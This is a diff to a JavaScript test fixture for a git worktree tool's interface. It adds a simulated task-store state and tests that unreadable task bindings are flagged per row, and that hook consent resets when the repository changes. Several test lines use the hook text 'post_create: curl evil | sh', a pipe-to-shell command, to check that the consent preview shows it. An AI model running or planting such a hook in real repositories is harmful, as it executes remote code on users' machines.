@@ -23,6 +23,7 @@ const branchDeletes = [], tagDeletes = [], branchCreates = [], wtRemovals = [], 
 let hooksFile = {file:".gitpulse/hooks",content:"post_create: make setup",approved:false};
 // The long worktree's change count; null is "not scanned", which is not clean.
 let wtDirty = 12;
+let taskMode = "off";
 let tags = [], tagsTruncated = false, failTags = false, deleteRefusal = "", failCreate = false;
 let current = "main", failMerge = false, pendingMerge = null, operation = null, probeFailed = false, copyFailed = false;
 // Churn and divergence are derived from the name so they are stable across
@@ -81,8 +82,10 @@ const fixture = {
   cmd_approve_worktree_hooks: a => {hookApprovals.push(a.content);if(a.content===hooksFile.content)hooksFile={...hooksFile,approved:true};return null;},
   cmd_remove_worktree: a => {wtRemovals.push({targetPath:a.targetPath,force:a.force});return null;},
   cmd_repository_trust: () => ({path:REPO,git_dir:`${REPO}/.git`,common_dir:`${REPO}/.git`,identity:"fixture",scope:"repository",worktrees:2}),
-  cmd_task_view: () => ({available:false,store_path:"",leases:[],error:""}),
-  cmd_worktree_task: () => null,
+  // "off": no DevCouncil store. "partial": one worktree's binding cannot be
+  // read. "down": the store itself cannot be read.
+  cmd_task_view: () => {if(taskMode==="down")throw Error("Fixture task store unreachable");return {available:taskMode!=="off",store_path:"",leases:[],error:""};},
+  cmd_worktree_task: a => {if(taskMode==="partial"&&a.worktreePath.includes(LONG_WORKTREE))throw Error("Fixture binding unreadable");return null;},
   cmd_push: a => {transfers.push({kind:"push",branch:a.branch});return "";},
   cmd_pull: a => {transfers.push({kind:"pull",branch:a.branch});return "";},
   cmd_merge_branch: async a => {merges.push(a);if(pendingMerge)await new Promise(resolve => {pendingMerge(resolve);});if(failMerge)throw Error("Fixture merge failed");return "Merged";},
@@ -278,8 +281,28 @@ if(params.has("check")) {
     [...consent().querySelectorAll("button")].find(b=>b.textContent.trim()==="Approve these hooks").click();
     await waitFor(()=>consent()?.textContent.includes("Approved. Editing the file asks again."));
     check("approving the text on screen marks it approved",hookApprovals.at(-1)==="post_create: curl evil | sh");
+    // The consent belongs to the repository it was read for: another tab must
+    // not inherit a ticked box and the previous repository's hooks text.
+    await repoStore.openRepo("/fixture/other");await settle();
+    await repoStore.openRepo("/fixture/branches");await settle();
+    await waitFor(()=>wtButton("Create worktree"));wtButton("Create worktree").click();await settle();
+    check("a repository switch drops the hooks box and the previous repository's preview",
+      formBox("Run repository hooks")?.checked===false&&!consent());
+    formBox("Run repository hooks").click();await waitFor(()=>consent()?.textContent.includes("post_create: curl evil | sh"));
     await submitWorktree("/fixture/wt-hooks");
     check("creating with hooks asked for sends that choice",wtCreates.at(-1).runHooks===true);
+    // A task state that could not be read is not an unbound worktree: the row
+    // says so, rather than the task line vanishing for everyone.
+    const unavailable=()=>(wtHost.textContent.match(/task state unavailable/g)??[]).length;
+    const reloadWorktrees=async()=>{await repoStore.openRepo("/fixture/other");await settle();await repoStore.openRepo("/fixture/branches");await settle();};
+    taskMode="partial";await reloadWorktrees();
+    await waitFor(()=>unavailable()>0);
+    check("one unreadable binding marks only its own row",unavailable()===1&&wtHost.querySelector('[title*="Fixture binding unreadable"]')?.textContent.includes("task state unavailable"));
+    taskMode="down";await reloadWorktrees();
+    await waitFor(()=>unavailable()>0);
+    check("an unreadable task store marks every row, with the reason in the title",unavailable()===2&&!!wtHost.querySelector('[title*="Fixture task store unreachable"]'));
+    taskMode="off";await reloadWorktrees();
+    check("a repository without a task store shows no task line at all",unavailable()===0);
     hooksFile={file:".gitpulse/hooks",content:"post_create: make setup",approved:false};
     await unmount(wtPanel);wtHost.remove();
 
